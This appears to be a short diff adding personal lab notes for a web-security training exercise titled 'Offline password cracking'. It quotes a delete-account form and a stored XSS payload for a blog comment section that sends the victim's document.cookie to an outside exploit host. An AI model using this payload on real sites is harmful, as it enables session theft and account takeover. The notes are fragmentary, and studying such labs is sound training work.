@@ -1,0 +1,14 @@
+Offline password cracking
+=========================
+
+
+
+to delete account:
+            <form id=delete-account-form action="/my-account/delete" method="POST">
+            <button class="button" type="submit">Delete account</button>
+
+
+exploit XSS in comments section of the blog
+
+    <script>document.location='//ac641f4a1fd72296c0a327d300d200f2.web-security-academy.net/'+document.cookie</script>
+
